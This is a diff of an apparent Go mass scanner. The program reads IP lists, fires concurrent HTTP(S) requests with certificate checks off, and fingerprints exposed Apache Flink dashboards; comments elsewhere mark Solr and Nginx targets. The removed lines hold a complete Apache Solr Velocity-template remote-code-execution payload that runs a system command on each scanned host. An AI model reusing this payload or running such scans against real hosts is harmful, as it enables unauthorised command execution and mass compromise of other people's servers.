@@ -40,18 +40,12 @@ func readFile(filePath string, urlQueue chan string, counter *int) error {
 		if strings.Contains(s.Text(), ":0:") || strings.Contains(s.Text(), "::") { //过滤大部分IPv6地址
 			continue
 		}
-		//assembleHTTP :="http://"+s.Text()+"/solr/wlslog/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
-		//assembleHTTP :="http://"+s.Text()+"/status"
-		//assembleHTTPs :="https://"+s.Text()+"/status"
-		//assembleHTTPs:="https://"+s.Text()+"/solr/wlslog/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
 
 		//assembleHTTP := "http://" + s.Text() + "/solr/#/"
 		//assembleHTTPs := "https://" + s.Text() + "/solr/#/"
 
 		assembleHTTP := "http://" + s.Text() + ":8081/#/overview"
 		assembleHTTPs := "https://" + s.Text() + ":8081/#/overview"
-
-
 
 		urls[assembleHTTP] = 1
 		urls[assembleHTTPs] = 1
@@ -171,7 +165,7 @@ func worker1(wg *sync.WaitGroup) {
 				}
 				c.SetDeadline(deadline)
 
-				return c, nil //最佳测试记录
+				return c, nil
 			},
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -210,20 +204,19 @@ func worker1(wg *sync.WaitGroup) {
 			req.Header.Add(key, value)
 		}
 		resp, err := client.Do(req)
-		//resp,err:=http.Get(url)
-		//defer resp.Body.Close()
 		if err != nil {
 			//fmt.Printf("Connection error in %s\n \tError Details: %s\n", url,err.Error())
 			continue
 		}
-		//fmt.Printf("URL: %s | status:%d\n",url,resp.StatusCode)
+		
+		//fmt.Printf("URL: %s | status:%d\n",url,resp.StatusCode
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
 			fmt.Println("IO error: ", err.Error(), "url: ", url)
 		}
 		content := string(body)
 
-		switch strings.Contains(content, "Running Job List") { //Apache solr RCE"solr "
+		switch strings.Contains(content, "Running Job List") { //Apache Flink
 		//switch strings.Contains(content,"groups") { //Apache solr RCE
 		//switch strings.Contains(content,"Nginx http upstream check status") {
 
@@ -276,5 +269,4 @@ func main() {
 	endTime := time.Now()
 	diff := endTime.Sub(startTime)
 	fmt.Printf("Total time taken %.2f seconds. Capability:%d url/s", diff.Seconds(), lineCounter/int(diff.Seconds()))
-	//fmt.Printf("Total time taken %d seconds. Capbility:%d url/s", diff.Seconds(),urlCounter/int(diff.Seconds()), )
 }
